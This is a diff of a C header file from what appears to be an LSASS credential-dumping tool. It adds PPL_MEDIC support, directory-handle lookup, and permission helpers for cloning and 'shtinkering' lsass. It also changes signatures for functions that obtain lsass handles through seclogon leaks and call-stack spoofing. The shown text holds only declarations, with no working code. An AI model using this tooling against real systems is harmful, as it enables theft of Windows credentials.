@@ -1,6 +1,6 @@
 #pragma once
 
-#if defined(NANO) && !defined(SSP)
+#if (defined(NANO) || defined(PPL_MEDIC)) && !defined(SSP)
 
 #include <windows.h>
 #include <winternl.h>
@@ -19,6 +19,7 @@ typedef DWORD(WINAPI* PssNtFreeSnapshot_t) (HANDLE SnapshotHandle);
 #define LSASS_EXE L"lsass.exe"
 #define PROCESS_HANDLE_TYPE L"Process"
 #define TOKEN_HANDLE_TYPE L"Token"
+#define DIRECTORY_HANDLE_TYPE L"Directory"
 
 #define MAX_PROCESSES 5000
 
@@ -163,6 +164,11 @@ BOOL find_process_handles_in_process(
     IN DWORD permissions,
     OUT PHANDLE_LIST* phandle_list);
 
+BOOL find_directory_handles_in_process(
+    IN DWORD process_pid,
+    IN DWORD permissions,
+    OUT PHANDLE_LIST* phandle_list);
+
 BOOL check_handle_privs(
     IN HANDLE handle,
     IN DWORD permissions);
@@ -176,6 +182,12 @@ HANDLE make_handle_full_access(
     IN HANDLE hProcess,
     IN DWORD attributes);
 
+DWORD get_lsass_min_permissions(VOID);
+
+DWORD get_lsass_clone_permissions(VOID);
+
+DWORD get_lsass_shtinkering_permissions(VOID);
+
 BOOL obtain_lsass_handle(
     OUT PHANDLE phProcess,
     IN DWORD lsass_pid,
@@ -183,7 +195,7 @@ BOOL obtain_lsass_handle(
     IN BOOL elevate_handle,
     IN BOOL duplicate_elevate,
     IN BOOL use_seclogon_duplicate,
-    IN DWORD spoof_callstack,
+    IN BOOL spoof_callstack,
     IN BOOL is_seclogon_leak_local_stage_2,
     IN LPCSTR seclogon_leak_remote_binary,
     OUT PPROCESS_LIST* Pcreated_processes,
@@ -201,7 +213,7 @@ HANDLE open_handle_to_lsass(
     IN DWORD permissions,
     IN BOOL dup,
     IN BOOL seclogon_race,
-    IN DWORD spoof_callstack,
+    IN BOOL spoof_callstack,
     IN BOOL is_malseclogon_stage_2,
     IN DWORD attributes);
 
@@ -216,7 +228,8 @@ HANDLE get_process_handle(
     IN DWORD attributes);
 
 BOOL get_all_handles(
-    OUT PSYSTEM_HANDLE_INFORMATION* phandle_table);
+    OUT PSYSTEM_HANDLE_INFORMATION* phandle_table,
+    OUT PULONG phandle_table_size);
 
 BOOL process_is_included(
     IN PPROCESS_LIST process_list,
@@ -226,7 +239,9 @@ BOOL get_processes_from_handle_table(
     IN PSYSTEM_HANDLE_INFORMATION handleTableInformation,
     OUT PPROCESS_LIST* pprocess_list);
 
-POBJECT_TYPES_INFORMATION query_object_types_info(VOID);
+BOOL query_object_types_info(
+    POBJECT_TYPES_INFORMATION* pObjectTypes,
+    PULONG pObjectTypesSize);
 
 BOOL get_type_index_by_name(
     IN LPWSTR handle_type,
